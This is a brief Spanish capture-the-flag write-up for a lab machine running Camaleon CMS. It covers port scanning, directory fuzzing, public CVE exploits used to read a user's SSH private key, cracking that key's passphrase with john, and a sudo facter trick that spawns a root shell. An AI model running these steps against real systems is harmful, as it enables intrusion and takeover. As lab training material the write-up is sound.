#PathTraversal #CamaleonCMS #Facter

Come
`nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 10.129.2.38 -oG allScan`

```
 [*] IP Address: 10.129.2.38
 [*] Open ports: 22,80,54321
 
```

`nmap -p 22,80,54321 -sCV 10.129.2.38 -oN targeted`


`wfuzz -c --hc 404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt http://facts.htb/FUZZ`
`http://facts.htb/admin/login`

Creamos una cuenta y accedemos con usuario creado, nos encontramos con un panel de admin de camaleón CMS versión 2.9.0
Encontramos un campo de subida de ficheros a la hora de editar nuestro perfil

encontramos un exploit en github que nos lo automatiza 
`https://github.com/predyy/CVE-2025-2304/blob/main/exp.py`

También una vez tenemos permisos de administrador vemos un CVE que nos permite ejecutar un Path traversal `https://github.com/Goultarde/CVE-2024-46987` con el podemos enumerar directorios y ficheros de dentro del servidor de la pagina web pudiendo así obtener el id_ed25519 del usuario trivia

Esta clave nos la podemos copiar a nuestra maquina atacante y conectarnos por ssh

Al intentar conectarnos por shh no pide una passphrase para descubrirla usaremos ssh2john para que nos de el hash y este guardarlo en un archivo hash y luego con john pasarle este archivo junto con una wordlist

Esto nos dará el passphrase de trivia que es dragonballz

Nos conectamos por ssh `ssh -i id_ed25519 trivia@10.129.2.38`

ejecutamos `sudo -l` y vemos que podemos ejecutar como root `/usr/bin/facter` para ejecutarlo y explotarlo haremos lo siguiente
```
echo 'Facter.add(:x){setcode{exec "/bin/bash"}}' > /tmp/x.rb
sudo facter --custom-dir=/tmp x
```

Y obtendremos la shell como root